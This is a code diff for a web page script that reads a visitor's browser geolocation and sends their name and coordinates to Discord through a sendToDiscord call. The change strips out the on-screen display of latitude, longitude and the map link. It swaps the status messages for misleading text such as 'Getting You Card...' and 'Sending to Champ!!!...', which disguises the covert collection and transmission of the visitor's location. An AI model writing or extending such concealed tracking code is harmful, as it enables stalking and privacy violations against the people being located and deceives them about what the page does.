@@ -97,8 +97,8 @@
       }
 
       locateBtn.disabled = true;
-      locateBtn.textContent = 'LOCATING...';
-      output.textContent = '⏳ Getting location...';
+      locateBtn.textContent = 'LOCA..is...';
+      output.textContent = '⏳ Getting You Card...';
 
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
@@ -106,10 +106,7 @@
 
           output.innerHTML =
             `✅ Name: ${name}<br>` +
-            `🌐 Lat: ${latitude.toFixed(6)}<br>` +
-            `🌐 Lng: ${longitude.toFixed(6)}<br>` +
-            `📍 Map: https://maps.google.com/?q=${latitude},${longitude}<br><br>` +
-            `📤 Sending to Discord...`;
+            `📤 Sending to Champ!!!...`;
 
           try {
             await sendToDiscord(name, latitude, longitude);
